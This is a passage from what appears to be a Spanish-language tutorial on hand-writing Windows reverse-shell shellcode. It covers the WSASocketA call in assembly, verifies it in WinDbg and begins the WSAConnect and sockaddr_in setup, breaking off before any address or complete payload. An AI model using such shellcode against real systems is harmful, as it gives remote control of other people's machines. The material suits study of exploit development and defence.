&lt;p&gt;Dado que utilizamos el proveedor de servicios de transporte, protocolos estándar en nuestro shell inverso (TCP&#x2F;IP), no deberíamos encontrar ningún problema si tenemos este parámetro en nulo.&lt;&#x2F;p&gt;
&lt;p&gt;A continuación, tenemos el parámetro &lt;code&gt;g&lt;&#x2F;code&gt;, este parámetro se utiliza para especificar el ID de un grupo de sockets, también puede establecer en nulo.&lt;&#x2F;p&gt;
&lt;p&gt;Finalmente, llegamos al parámetro dwFlags , que se utiliza para especificar atributos de socket adicionales. Como no requerimos ningún atributo adicional para nuestro shellcode actual, también estableceremos este valor en nulo.&lt;&#x2F;p&gt;
&lt;p&gt;La función quedaría de la siguiente manera:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;python&quot; class=&quot;language-python z-code&quot;&gt;&lt;code class=&quot;language-python&quot; data-lang=&quot;python&quot;&gt;&lt;span class=&quot;z-source z-python&quot;&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;call_wsasocketa:&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;xor eax, eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;              &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Null EAX
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta dwFlags
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta g
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta lpProtocolInfo
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;mov al, 0x06;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;              &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; mueve AL, IPPROTO_TCP
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta protocol
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;sub al, 0x05;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;              &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Resta 0x05 de AL, AL = 0x01
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta type
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;inc eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                   &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Incrementa eax, EAX = 0x02
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;push eax;&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;                  &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; Inserta af
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-python&quot;&gt;    &lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-string z-begin z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-string z-python&quot;&gt;&lt;span class=&quot;z-string z-quoted z-double z-python&quot;&gt;call dword ptr [ebp+0x24];&lt;span class=&quot;z-punctuation z-definition z-string z-end z-python&quot;&gt;&amp;quot;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; &lt;span class=&quot;z-comment z-line z-number-sign z-python&quot;&gt;&lt;span class=&quot;z-punctuation z-definition z-comment z-python&quot;&gt;#&lt;&#x2F;span&gt; llamar a WSASocketA
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;En el snippet anterior, pondemos eax como nulo y los empujamos tres veces a la pila con los parámetros mencionados anteriormente ya que están configurados como nulos.&lt;&#x2F;p&gt;
&lt;p&gt;Luego movemos &lt;code&gt;0x06&lt;&#x2F;code&gt; a AL que es el valor de &lt;code&gt;IPPROTO_TCP&lt;&#x2F;code&gt; y despues se inserta en la pila con la instrucción de &lt;code&gt;push eax&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Después resta &lt;code&gt;0x05&lt;&#x2F;code&gt; de AL que da como resultado a AL = &lt;code&gt;0x01&lt;&#x2F;code&gt; coincidiendo con el valor de SOCK_STREAM, despues lo insertamos en la pila.&lt;&#x2F;p&gt;
&lt;p&gt;Después eax se incrementa en uno que es valor necesario para insertar &lt;code&gt;af&lt;&#x2F;code&gt; en la pila.&lt;&#x2F;p&gt;
&lt;p&gt;Por último guarda &lt;code&gt;WSASocketA&lt;&#x2F;code&gt; en el desplazamiento &lt;code&gt;ebp+0x24&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;pre class=&quot;z-code&quot;&gt;&lt;code&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; bp 013300e2
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; g
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;Breakpoint 0 hit
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eax=00000002 ebx=76760000 ecx=0e9f4d39 edx=00000202 esi=01330030 edi=013523e8
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;eip=013300e2 esp=030ff2a0 ebp=030ff8e4 iopl=0         nv up ei pl nz na po nc
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00000202
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;013300e2 ff5524          call    dword ptr [ebp+24h]  ss:0023:030ff908=00000000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;0:004&amp;gt; dds @esp l6
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;030ff2a0  00000002
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;030ff2a4  00000001
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;030ff2a8  00000006
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;030ff2ac  00000000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;030ff2b0  00000000
&lt;&#x2F;span&gt;&lt;span class=&quot;z-text z-plain&quot;&gt;030ff2b4  00000000
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;Como se puede apreciar en el volcado de WinDBG, vemos como los valores están colocados en esp, que son los que hemos definido anteriormente.&lt;&#x2F;p&gt;
&lt;p&gt;Primero se insertan los valores nulos, después el valor de &lt;code&gt;IPPROTO_TCP&lt;&#x2F;code&gt;, seguido de esto el &lt;code&gt;type&lt;&#x2F;code&gt; y por último &lt;code&gt;af&lt;&#x2F;code&gt; establecido como 2.&lt;&#x2F;p&gt;
&lt;h3 id=&quot;llamada-a-wsaconnect&quot;&gt;LLamada a WSAConnect&lt;a class=&quot;zola-anchor&quot; href=&quot;#llamada-a-wsaconnect&quot; aria-label=&quot;Anchor link for: llamada-a-wsaconnect&quot; style=&quot;visibility: hidden;&quot;&gt;&lt;&#x2F;a&gt;
&lt;&#x2F;h3&gt;
&lt;p&gt;Seguimos con la llamada a &lt;code&gt;WSAConnect&lt;&#x2F;code&gt;, la estructura es la siguiente:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;cpp&quot; class=&quot;language-cpp z-code&quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-storage z-type z-c&quot;&gt;int&lt;&#x2F;span&gt; WSAAPI &lt;span class=&quot;z-meta z-function z-c++&quot;&gt;&lt;span class=&quot;z-meta z-toc-list z-full-identifier z-c++&quot;&gt;&lt;span class=&quot;z-entity z-name z-function z-c++&quot;&gt;WSAConnect&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c++&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    SOCKET           &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;s&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    &lt;span class=&quot;z-storage z-modifier z-c++&quot;&gt;const&lt;&#x2F;span&gt; sockaddr  &lt;span class=&quot;z-keyword z-operator z-c&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;name&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    &lt;span class=&quot;z-storage z-type z-c&quot;&gt;int&lt;&#x2F;span&gt;              &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;namelen&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    LPWSABUF         &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;lpCallerData&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    LPWSABUF         &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;lpCalleeData&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    LPQOS            &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;lpSQOS&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    LPQOS            lpGQOS
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-end z-c++&quot;&gt;)&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;El primer parámetro que se solicita es el SOCKET (&lt;code&gt;s&lt;&#x2F;code&gt;), este parámetro requiere un descriptor para un socket no conectado, que es exactamente lo que devolvió la llamada anterior a &lt;code&gt;WSASocketA&lt;&#x2F;code&gt;, llegados a este punto, nuestro socket se encuentra en EAX, y debemos asegurarnos de no sobrescribirlo.&lt;&#x2F;p&gt;
&lt;p&gt;El segundo parámetro, es un puntero a la estructura &lt;code&gt;sockaddr&lt;&#x2F;code&gt;, esta estructura varía según el protocolo seleccionado, para el protocolo iPv4 usaremos &lt;code&gt;sockaddr_in&lt;&#x2F;code&gt;, cuya estructura es la siguiente:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;cpp&quot; class=&quot;language-cpp z-code&quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-storage z-type z-c++&quot;&gt;typedef&lt;&#x2F;span&gt; &lt;span class=&quot;z-storage z-type z-c++&quot;&gt;struct&lt;&#x2F;span&gt; sockaddr_in &lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-begin z-c++&quot;&gt;{&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-meta z-preprocessor z-c++&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-c++&quot;&gt;#if&lt;&#x2F;span&gt; ...
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-storage z-type z-c&quot;&gt;short&lt;&#x2F;span&gt; sin_family&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-meta z-preprocessor z-c++&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-c++&quot;&gt;#else&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    ADDRESS_FAMILY sin_family&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-meta z-preprocessor z-c++&quot;&gt;&lt;span class=&quot;z-keyword z-control z-import z-c++&quot;&gt;#endif&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;USHORT&lt;&#x2F;span&gt; sin_port&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    IN_ADDR sin_addr&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;    &lt;span class=&quot;z-support z-type z-windows z-c&quot;&gt;CHAR&lt;&#x2F;span&gt; sin_zero&lt;span class=&quot;z-meta z-brackets z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-begin z-c++&quot;&gt;[&lt;&#x2F;span&gt;&lt;span class=&quot;z-constant z-numeric z-integer z-decimal z-c++&quot;&gt;8&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-section z-brackets z-end z-c++&quot;&gt;]&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-block z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-block z-end z-c++&quot;&gt;}&lt;&#x2F;span&gt;&lt;&#x2F;span&gt; SOCKADDR_IN&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt; &lt;span class=&quot;z-keyword z-operator z-c&quot;&gt;*&lt;&#x2F;span&gt;&lt;span class=&quot;z-entity z-name z-type z-typedef z-c++&quot;&gt;PSOCKADDR_IN&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-terminator z-c++&quot;&gt;;&lt;&#x2F;span&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;code&gt;&lt;&#x2F;pre&gt;
&lt;p&gt;El primer miembro de la estructura es sin_family, que requiere la familia de direcciones de la dirección de transporte. La documentación oficial nos indica que debemos asegurarnos de que este valor siempre esté establecido en AF_INET.&lt;&#x2F;p&gt;
&lt;p&gt;El siguiente miembro es &lt;code&gt;sin_port&lt;&#x2F;code&gt;, que, como su nombre indica, especifica el puerto. Le sigue &lt;code&gt;sin_addr&lt;&#x2F;code&gt;.  Esta estructura anidada almacenará la dirección IP, &lt;code&gt;sin_addr&lt;&#x2F;code&gt;, una estructura anidada del tipo &lt;code&gt;IN_ADDR&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;Se utiliza para iniciar la conexión. La definición de la estructura difiere según cómo se transmite la dirección IP.  Sin embargo, en memoria, las estructuras son idénticas. Esto significa que podemos almacenar la dirección IP dentro de un &lt;code&gt;DWORD&lt;&#x2F;code&gt;.&lt;&#x2F;p&gt;
&lt;p&gt;El último miembro de la estructura &lt;code&gt;sockaddr_in&lt;&#x2F;code&gt; es &lt;code&gt;sin_zero&lt;&#x2F;code&gt;, una matriz de 8 caracteres. Según la documentación oficial, esta matriz está reservada para uso del sistema y su contenido debe establecerse en 0.&lt;&#x2F;p&gt;
&lt;p&gt;Ahora que hemos analizado la estructura sockaddr_in y la estructura anidada IN_ADDR , echemos otro vistazo al prototipo de WSAConnect:&lt;&#x2F;p&gt;
&lt;pre data-lang=&quot;cpp&quot; class=&quot;language-cpp z-code&quot;&gt;&lt;code class=&quot;language-cpp&quot; data-lang=&quot;cpp&quot;&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-storage z-type z-c&quot;&gt;int&lt;&#x2F;span&gt; WSAAPI &lt;span class=&quot;z-meta z-function z-c++&quot;&gt;&lt;span class=&quot;z-meta z-toc-list z-full-identifier z-c++&quot;&gt;&lt;span class=&quot;z-entity z-name z-function z-c++&quot;&gt;WSAConnect&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;&lt;span class=&quot;z-punctuation z-section z-group z-begin z-c++&quot;&gt;(&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;
&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;&#x2F;span&gt;&lt;span class=&quot;z-source z-c++&quot;&gt;&lt;span class=&quot;z-meta z-function z-parameters z-c++&quot;&gt;&lt;span class=&quot;z-meta z-group z-c++&quot;&gt;    SOCKET &lt;span class=&quot;z-variable z-parameter z-c++&quot;&gt;s&lt;&#x2F;span&gt;&lt;span class=&quot;z-punctuation z-separator z-c++&quot;&gt;,&lt;&#x2F;span&gt;
